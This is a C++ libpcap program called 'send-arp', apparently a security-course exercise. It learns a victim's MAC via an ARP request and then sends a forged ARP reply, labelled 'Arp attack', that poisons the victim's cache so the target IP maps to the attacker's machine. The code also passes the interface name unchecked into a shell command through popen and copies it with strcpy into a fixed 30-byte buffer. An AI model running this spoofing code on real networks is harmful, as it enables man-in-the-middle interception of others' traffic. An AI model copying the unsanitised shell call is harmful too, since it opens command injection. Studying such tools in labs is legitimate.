#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <fstream>
#include <iostream>
#include <stdlib.h>
#include <string.h>
using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	// myMAC capture
	ifstream iface("/sys/class/net/" + string(dev) + "/address");
  	string MY_MAC((istreambuf_iterator<char>(iface)), istreambuf_iterator<char>());
  	cout << "System MAC Address is : " << MY_MAC;
  	
	FILE *fp;
	string get_ip_string = string("ifconfig ") + string(dev) + string(" | grep \"inet \" | awk -F ' ' '{print $2}'");
	char get_ip[30];
	strcpy(get_ip, get_ip_string.c_str());
	fp = popen(get_ip, "r");
	fgets(errbuf, PCAP_ERRBUF_SIZE, fp);
	printf("My IP Address is : %s", errbuf);
	pclose(fp);

  	Mac myMAC = (Mac)MY_MAC;
	Mac senderMAC;
	Ip myIP = Ip(errbuf);
	Ip senderIP = Ip(argv[2]);
	Ip targetIP = Ip(argv[3]);
	
	
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = myMAC;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = myMAC;
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.sip_ = htonl(myIP);
	packet.arp_.tip_ = htonl(senderIP);

	// broadcast
	int res_request = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res_request != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_request, pcap_geterr(handle));
	}
	
	// senderIP capture
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	while(1) {
		struct pcap_pkthdr* req_header; 	//time & length
		const u_char* req_packet;		//packet pointer
		int res_pcap = pcap_next_ex(pcap, &req_header, &req_packet);
		
		EthArpPacket *ea_packet = (EthArpPacket*)req_packet;
		if(ea_packet->arp_.sip() == senderIP){
			senderMAC = ea_packet->arp_.smac();
		  	cout << "Sender MAC Address is : " << string(senderMAC);
		  	break;
		}
	}

	packet.eth_.dmac_ = senderMAC;
	packet.eth_.smac_ = myMAC;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = myMAC;
	packet.arp_.tmac_ = senderMAC;
	packet.arp_.sip_ = htonl(targetIP);
	packet.arp_.tip_ = htonl(senderIP);
	
	// Arp attack
	printf("\nArp attck start ...\n");
//	while(1){
		int res_arp = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res_arp != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_arp, pcap_geterr(handle));
		}
//	}
	
	pcap_close(handle);
}
